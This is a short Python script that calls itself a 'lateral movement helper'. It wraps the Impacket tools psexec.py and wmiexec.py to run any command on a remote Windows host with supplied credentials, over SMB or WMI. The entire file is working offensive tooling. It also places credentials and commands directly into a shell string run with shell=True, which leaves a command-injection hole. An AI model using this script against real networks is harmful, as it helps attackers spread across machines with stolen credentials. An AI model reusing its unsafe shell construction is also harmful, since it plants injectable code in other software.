#!/usr/bin/env python3

import subprocess
import argparse
import sys

def run(cmd):
    try:
        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
        return result
    except Exception as e:
        return str(e)

def smb_exec(target, user, password, command):
    cmd = f"psexec.py {user}:{password}@{target} '{command}'"
    return run(cmd)

def wmiexec(target, user, password, command):
    cmd = f"wmiexec.py {user}:{password}@{target} '{command}'"
    return run(cmd)

def main():
    parser = argparse.ArgumentParser(description="Simple lateral movement helper")
    parser.add_argument("--target", required=True, help="Target host")
    parser.add_argument("--user", required=True, help="Username")
    parser.add_argument("--password", required=True, help="Password")
    parser.add_argument("--cmd", required=True, help="Command to execute remotely")
    parser.add_argument("--method", choices=["smb", "wmi"], default="smb")

    args = parser.parse_args()

    if args.method == "smb":
        print(smb_exec(args.target, args.user, args.password, args.cmd))
    else:
        print(wmiexec(args.target, args.user, args.password, args.cmd))

if __name__ == "__main__":
    main()

